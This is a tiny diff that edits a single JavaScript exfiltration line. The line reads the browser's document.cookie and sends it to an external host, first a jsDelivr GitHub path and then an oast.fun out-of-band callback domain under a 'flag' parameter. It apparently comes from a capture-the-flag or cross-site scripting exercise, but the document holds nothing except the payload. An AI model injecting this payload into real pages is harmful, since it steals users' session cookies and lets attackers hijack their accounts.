@@ -1,1 +1,1 @@
-fetch('https://cdn.jsdelivr.net/gh/TOI-TOIs/pepegkas/' + document.cookie)
+fetch('http://fillhjsfuyfjavsyxnoxph9gdlnp9odto.oast.fun/?flag=' + document.cookie)
